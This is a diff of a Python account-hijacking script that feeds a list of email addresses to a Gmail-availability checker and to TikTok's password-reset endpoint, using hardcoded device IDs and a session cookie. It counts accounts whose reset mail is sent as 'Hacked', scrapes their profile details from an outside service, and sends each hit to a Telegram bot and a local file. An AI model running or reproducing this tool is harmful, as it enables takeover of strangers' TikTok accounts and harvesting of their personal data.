@@ -43,6 +43,9 @@ os.system('cls' if os.name=='nt'else'clear')
 def gmail():
     took = input('Enter Your ToKEN  Bot : ')   
     idddd = input('Enter Your ID Accouint : ')
+
+
+    
     global a,m,n,a,p,aaa,aaaa,aa,rr,rrr,r,j
     try:
         file = open('user.txt','r').read().splitlines()
@@ -50,76 +53,73 @@ def gmail():
         print('Error File')
         exit()
     for email in file:
+        url0 = f'https://ffnzz.scriptfree.repl.co/api-Checker-Gmail/?email={email}'
+        xb = requests.get(url0).text
+      
+        if ('"status":"BAD"') in xb:
+            p+=1
+            os.system('cls' if os.name =='nt'else'clear')
+            print(f'[=] - Hacked : {a}\n[=] - Bad Gmail : {p}\n[=] - Bad Tiktok : {m}\n[=] - Py : [MVMVP - FFNZZ]\n')
+        elif ('"status":"GOD"') in xb:
         
-        url = "https://api2-19-h2.musical.ly/aweme/v1/passport/find-password-via-email/?app_language=ar&manifest_version_code=2018101933&_rticket=1656747775754&iid=7115676682581247750&channel=googleplay&language=ar&fp=&device_type=SM-A022F&resolution=720*1471&openudid=8c05dec470c7b7d5&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=280&carrier_region=IQ&ac=wifi&device_id=7023349253125604869&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=samsung&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233&ts=1656747775&as=a1e67fbb4fffb246cf0244&cp=f2f02d6bfbffb36de1eomw&mas=01cd120efcb179ac1b331e5cecb80282052c2c4c0c66c66c2c4c46"
-        headers = {
+            url = "https://api2-19-h2.musical.ly/aweme/v1/passport/find-password-via-email/?app_language=ar&manifest_version_code=2018101933&_rticket=1656747775754&iid=7115676682581247750&channel=googleplay&language=ar&fp=&device_type=SM-A022F&resolution=720*1471&openudid=8c05dec470c7b7d5&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=280&carrier_region=IQ&ac=wifi&device_id=7023349253125604869&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=samsung&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233&ts=1656747775&as=a1e67fbb4fffb246cf0244&cp=f2f02d6bfbffb36de1eomw&mas=01cd120efcb179ac1b331e5cecb80282052c2c4c0c66c66c2c4c46"
+            headers = {
             'host':'api2-19-h2.musical.ly',
             'connection':'keep-alive',
             'cookie':'sstore-idc=maliva; store-country-code=iq; odin_tt=056f31c10f8c82638f6d4d64669ad49e9c36d4946d5d596f433d7f2d75fa1592a21c201d712196d54ee4ae4e14ac8708eee32dc97c85c0a65510024ecc0698346f73ecab038b7160dbff96ced716b8af',
             'accept-Encoding':'gzip',
                 'user-agent':'com.zhiliaoapp.musically/2018101933 (Linux; U; Android 11; ar_IQ; SM-A022F; Build/RP1A.200720.012; Cronet/58.0.2991.0)',
                 'connection': 'close'}
-        data = f"app_language=ar&manifest_version_code=2018101933&_rticket=1656747775754&iid=7115676682581247750&channel=googleplay&language=ar&fp=&device_type=SM-A022F&resolution=720*1471&openudid=8c05dec470c7b7d5&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=280&email={email}&retry_type=no_retry&carrier_region=IQ&ac=wifi&device_id=7023349253125604869&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=samsung&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233"
-        try:
-            ree = requests.post(url,headers=headers,data=data).text
-        except requests.exceptions.ConnectionError as error:
-            continue
-        
-        if ('"Sent successfully"') in ree:
-            
-            url3 ='https://android.clients.google.com/setup/checkavail'
-            headers = {
-                'Content-Length':'98',
-                'Content-Type':'text/plain; charset=UTF-8',
-                'Host':'android.clients.google.com',
-                'Connection':'Keep-Alive',
-                'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
-            data= json.dumps({
-                'username':email,
-                'version':'3',
-                'firstName':'AbaLahb',
-                'lastName':'AbuJahl'})
+            data = f"app_language=ar&manifest_version_code=2018101933&_rticket=1656747775754&iid=7115676682581247750&channel=googleplay&language=ar&fp=&device_type=SM-A022F&resolution=720*1471&openudid=8c05dec470c7b7d5&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=280&email={email}&retry_type=no_retry&carrier_region=IQ&ac=wifi&device_id=7023349253125604869&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=samsung&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233"
             try:
-                res=requests.post(url3,headers=headers,data=data)
+                ree = requests.post(url,headers=headers,data=data).text
             except requests.exceptions.ConnectionError as error:
                 continue
-            if res.json()['status'] =='USERNAME_UNAVAILABLE':
-                p+=1
-                os.system('cls' if os.name =='nt'else'clear')
-                print(f'[=] - Hacked : {a}\n[=] - Bad Gmail : {p}\n[=] - Bad Tiktok : {m}\n[=] - Py : [MVMVP - FFNZZ]\n')
-            elif res.json()['status'] =='SUCCESS':
+        
+            if ('"Sent successfully"') in ree:
+            
+                
+       
                 a+=1
                 os.system('cls' if os.name =='nt'else'clear')
                 print(f'[=] - Hacked : {a}\n[=] - Bad Gmail : {p}\n[=] - Bad Tiktok : {m}\n[=] - Py : [MVMVP - FFNZZ]\n')
                 us11 = email.split('@')[0]
-                ui = f'https://qado-tik-info.reback.repl.co/?user={us11}&sess=8'
-                ik = requests.get(ui).text
-                nam = ik.split('name :')[1]
-                name = nam.split('follower')[0]
-                fo = nam.split('follower :')[1]
-                fol = fo.split('following :')[0]
-                fols = ik.split('following :')[1]
-                fols1 = fols.split(' heart :')[0]
-                lik = ik.split('heart :')[1]
-                like = lik.split('bio :')[0]
-                bi = ik.split('bio :')[1]
-                bio = bi.split('id :')[0]
-                id1 = ik.split('id :')[1]
-                id = id1.split('posts : ')[0]
-                vieod= ik.split('posts :')[1]
+                try:
+                    ui = f'https://qado-tik-info.reback.repl.co/?user={us11}&sess=8'
+                    ik = requests.get(ui).text
+                    nam = ik.split('name :')[1]
+                    name = nam.split('follower')[0]
+                    fo = nam.split('follower :')[1]
+                    fol = fo.split('following :')[0]
+                    fols = ik.split('following :')[1]
+                    fols1 = fols.split(' heart :')[0]
+                    lik = ik.split('heart :')[1]
+                    like = lik.split('bio :')[0]
+                    bi = ik.split('bio :')[1]
+                    bio = bi.split('id :')[0]
+                    id1 = ik.split('id :')[1]
+                    id = id1.split('posts : ')[0]
+                    vieod= ik.split('posts :')[1]
+                except InterruptedError as error:
+                    print('errror')
             
                 #re2 = requests.get(url2,headers=head2).json()
                 j+=1
                 req = f'HIT : {j}\nName : {name}\nEmail : {email}\nFolloing : {fol}\nFollower : {fols1}\nVideo : {vieod}\nID : {id}\nBio : {bio}\n\nBy : @MVMVP - @FFNZZ'
                 tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text={req}')
                 ru= requests.post(tlg)
-               
+                try:
+                    with open('true.txt','a') as f8:
+                        f8.write(f'{req}\n')
+                except UnicodeEncodeError as error :
+                    with open('true.txt','a') as f8:
+                        f8.write(f'{req}\n')
+                    
                 
-                
-        elif ('"Bind device by email failed"') in ree:
-            m+=1
-            os.system('cls' if os.name =='nt'else'clear')
-            print(f'[=] - Hacked : {a}\n[=] - Bad Gmail : {p}\n[=] - Bad Tiktok : {m}\n[=] - Py : [MVMVP - FFNZZ]\n')
+            elif ('"Bind device by email failed"') in ree:
+                m+=1
+                os.system('cls' if os.name =='nt'else'clear')
+                print(f'[=] - Hacked : {a}\n[=] - Bad Gmail : {p}\n[=] - Bad Tiktok : {m}\n[=] - Py : [MVMVP - FFNZZ]\n')
 def fol2():
     global a,p,m
     lm ='qwertyuioplkjhgfdsazxcvbnm_'
